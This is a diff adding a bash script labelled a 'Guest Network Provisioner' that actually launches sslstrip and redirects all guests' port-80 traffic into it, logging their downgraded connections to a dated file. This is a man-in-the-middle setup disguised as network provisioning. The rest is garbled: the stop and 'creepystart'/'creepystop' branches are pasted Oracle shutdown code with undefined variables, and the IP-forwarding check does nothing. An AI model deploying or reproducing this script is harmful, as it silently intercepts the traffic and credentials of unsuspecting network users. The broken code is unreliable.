@@ -1,0 +1,56 @@
+#!/bin/bash
+# Guest Network Provisioner
+WAN=eth0
+LAN=eth1
+
+
+
+sslstrip -l 10000 -f -w sslstrip-`date +%Y%m%d`.log &>/dev/null
+
+#/usr/bin/ap-hotspot start
+
+#wondershaper wlan0 512 512
+
+case "$1" in
+    start)
+        # Start Guest Network
+        line=$(cat /proc/sys/net/ipv4/ip_forward)
+		if [ $? -eq 1 ]
+		    then
+		    echo "IP Forwarding not enabled"
+		    echo "Enabling IP Forwarding"
+		fi
+        echo "Configuring NAT on "
+        iptables --table nat --append POSTROUTING --out-interface $WAN -j MASQUERADE
+		iptables --append FORWARD --in-interface $LAN -j ACCEPT
+		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+        echo "OK"
+        ;;
+    stop)
+	 	# Stop Guest Network
+        echo -n "Shutdown Oracle: "
+        su - $ORA_OWNR -c "$ORA_HOME/bin/lsnrctl stop"
+        su - $ORA_OWNR -c $ORA_HOME/bin/dbshut
+        rm -f /var/lock/subsys/oracle
+        echo "OK"
+        ;;
+    creepystart)
+	 	# Stop Guest Network
+        echo -n "Shutdown Oracle: "
+        su - $ORA_OWNR -c "$ORA_HOME/bin/lsnrctl stop"
+        su - $ORA_OWNR -c $ORA_HOME/bin/dbshut
+        rm -f /var/lock/subsys/oracle
+        echo "OK"
+        ;;
+    creepystop)
+	 	# Stop Guest Network
+        echo -n "Shutdown Oracle: "
+        su - $ORA_OWNR -c "$ORA_HOME/bin/lsnrctl stop"
+        su - $ORA_OWNR -c $ORA_HOME/bin/dbshut
+        rm -f /var/lock/subsys/oracle
+        echo "OK"
+        ;;
+    *)
+        echo "Usage: $0 start|stop"
+        exit 1
+esac
